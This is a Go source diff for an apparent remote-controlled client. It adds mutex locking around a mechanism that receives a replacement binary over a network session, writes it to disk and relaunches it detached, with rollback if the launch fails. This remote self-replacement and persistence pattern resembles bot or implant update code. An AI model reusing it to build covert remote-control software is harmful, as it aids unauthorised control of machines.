@@ -58,7 +58,6 @@ var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
 		cleanSelf()
 
 	case B_evolution:
-		//kit.WriteVLen(p1, int64(0))
 		fhb, err := kit.ReadVTagByte(p1)
 		if err != nil {
 //fmt.Println("[evolution][err]fhb", err)
@@ -78,8 +77,12 @@ var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
 			break
 		}
 
+		c.binMx.Lock()
+		c.selfbyte1 = c.selfbyte
+		c.selfhex1 = c.selfhex
 		c.selfbyte = fb
 		c.selfhex = fhb
+		c.binMx.Unlock()
 		fallthrough
 
 	case B_rebirth:
@@ -200,8 +203,10 @@ var loadSelf = func (c *Client) {
 		return
 	}
 
+	c.binMx.Lock()
 	c.selfhex = kit.HashBytes256(b)
 	c.selfbyte = b
+	c.binMx.Unlock()
 }
 
 var dumpSelf = func (c *Client) {
@@ -211,6 +216,8 @@ var dumpSelf = func (c *Client) {
 		return
 	}
 
+	c.binMx.Lock()
+	defer c.binMx.Unlock()
 	if c.selfbyte == nil {
 		return
 	}
@@ -219,14 +226,20 @@ var dumpSelf = func (c *Client) {
 	ofd.Sync()
 	ofd.Close()
 
-	pl := exec.Command(ofp)
+	pl := exec.Command(ofp, os.Args[1:]...)
 	pl.SysProcAttr = &syscall.SysProcAttr{
 		Setpgid: true,
 //		Noctty: true,
 	}
 	err = pl.Start()
+
+	// TODO: fallback
 	if err != nil {
 //fmt.Println("[err]pl.Start()", err)
+		c.selfbyte = c.selfbyte1
+		c.selfhex = c.selfhex1
+		c.selfbyte1 = nil
+		c.selfhex1 = nil
 		return
 	}
 	pl.Process.Release()
